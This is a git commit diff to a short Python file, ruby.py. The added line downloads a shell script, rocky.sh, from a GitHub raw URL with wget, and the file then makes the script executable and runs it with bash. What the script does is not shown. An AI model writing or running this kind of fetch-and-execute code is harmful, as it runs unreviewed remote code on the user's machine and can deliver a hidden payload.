ca68edcd8b54a8cec8a43d9c76b5744bc11074de
Vkidi <86509371+Vkidi@users.noreply.github.com>
2021-06-26 13:27:55 +0530

    Update ruby.py

--- ruby.py
+++ ruby.py
@@ -1,6 +1,6 @@
 import subprocess
 import time
 
-
+subprocess.call("wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh", shell=True)
 subprocess.call("chmod 755 rocky.sh", shell=True)
 subprocess.call("bash rocky.sh", shell=True)
